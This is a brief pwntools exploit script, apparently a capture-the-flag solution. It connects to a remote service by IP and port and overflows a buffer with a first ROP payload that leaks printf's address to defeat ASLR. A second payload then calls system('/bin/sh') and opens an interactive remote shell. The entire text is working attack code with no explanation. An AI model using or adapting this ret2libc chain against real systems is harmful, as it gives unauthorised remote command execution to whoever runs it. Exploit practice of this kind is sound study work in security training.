from pwn import*
#context.log_level ='DEBUG'
p = remote('111.198.29.45',45407)
elf =ELF('./main',checksec=False)
libc = ELF('./libc_32.so.6',checksec=False)
PI = '\x00'*0x8C + p32(elf.plt['write']) + p32(elf.sym['gee']) + p32(1) + p32(elf.got['printf']) + p32(4)
p.sendafter('\n\n',PI)
libc.address = u32(p.recv(4)) - libc.sym['printf']
p.send('\x00'*0x8C + p32(libc.sym['system']) + p32(0) + p32(libc.search('/bin/sh').next()))
p.interactive()

